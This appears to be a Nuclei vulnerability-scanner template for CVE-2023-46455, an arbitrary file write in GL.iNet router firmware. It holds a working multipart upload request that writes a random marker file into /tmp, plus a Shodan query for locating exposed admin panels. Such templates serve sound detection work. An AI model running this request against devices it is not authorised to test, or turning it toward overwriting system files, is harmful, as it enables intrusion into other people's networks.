flow: http(1) && http(2)
http:
- matchers:
  - case-insensitive: true
    internal: true
    part: body
    type: word
    words:
    - GL.iNet
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - File uploaded successfully
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /upload HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------81419250823331111993422505835

    X-Requested-With: XMLHttpRequest


    -----------------------------81419250823331111993422505835

    Content-Disposition: form-data; name="sid"


    {{auth_token}}

    -----------------------------81419250823331111993422505835

    Content-Disposition: form-data; name="size"


    4

    -----------------------------81419250823331111993422505835

    Content-Disposition: form-data; name="path"


    /tmp/{{string}}

    -----------------------------81419250823331111993422505835

    Content-Disposition: form-data; name="file"; filename="{{file}}"

    Content-Type: application/octet-stream


    {{string}}

    -----------------------------81419250823331111993422505835--

    '
id: CVE-2023-46455
info:
  author: Zierax
  classification:
    cpe: cpe:2.3:o:gl-inet:gl-ar300m_firmware:4.3.7:*:*:*:*:*:*:*
    cve-id: CVE-2023-46455
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.97511
    epss-score: 0.46103
  description: 'GL.iNet <= 4.3.7 is vulnerable to an arbitrary file write exploit,
    allowing an attacker to overwrite arbitrary system files.

    '
  impact: 'Unauthenticated attackers can overwrite arbitrary system files, potentially
    compromising the device configuration and enabling persistent access.

    '
  metadata:
    max-request: 1
    product: gl-ar300m_firmware
    shodan-query: title:"GL.iNet Admin Panel"
    vendor: gl-inet
  name: GL.iNet <= 4.3.7 - Arbitrary File Write
  reference:
  - https://github.com/cyberaz0r/GL.iNet-Multiple-Vulnerabilities/blob/main/CVE-2023-46455.py
  - https://nvd.nist.gov/vuln/detail/CVE-2023-46455
  remediation: 'Upgrade GL.iNet devices to firmware version 4.3.8 or later.

    '
  severity: high
  tags: cve,cve2023,gl-net,file-upload,intrusive,vuln
variables:
  file: '{{to_lower(rand_text_alpha(4))}}'
  string: '{{to_lower(rand_text_alpha(5))}}'
